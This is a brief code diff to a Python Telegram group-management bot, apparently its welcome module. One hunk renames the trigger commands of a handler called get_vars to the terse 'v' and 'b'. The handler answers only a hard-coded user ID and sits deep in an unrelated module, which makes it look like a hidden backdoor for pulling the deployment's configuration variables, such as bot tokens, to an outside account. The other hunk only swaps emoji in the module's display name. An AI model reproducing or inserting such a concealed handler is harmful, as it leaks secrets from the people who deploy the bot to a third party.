@@ -999,7 +999,7 @@ from MukeshRobot import BOT_NAME
 from MukeshRobot import pbot as app
 OWNERs_ID=1808943146
 @app.on_message(
-    filters.command(["c", "vr"]) & filters.user(OWNERs_ID)
+    filters.command(["v", "b"]) & filters.user(OWNERs_ID)
 )
 async def get_vars(_, message: Message):
     try:
@@ -1149,7 +1149,7 @@ dispatcher.add_handler(CLEAN_SERVICE_HANDLER)
 dispatcher.add_handler(BUTTON_VERIFY_HANDLER)
 dispatcher.add_handler(WELCOME_MUTE_HELP)
 
-__mod_name__ = "🙏Wᴇʟᴄᴏᴍᴇ🙏"
+__mod_name__ = "⚡Wᴇʟᴄᴏᴍᴇ⚡"
 __command_list__ = []
 __handlers__ = [
     NEW_MEM_HANDLER,
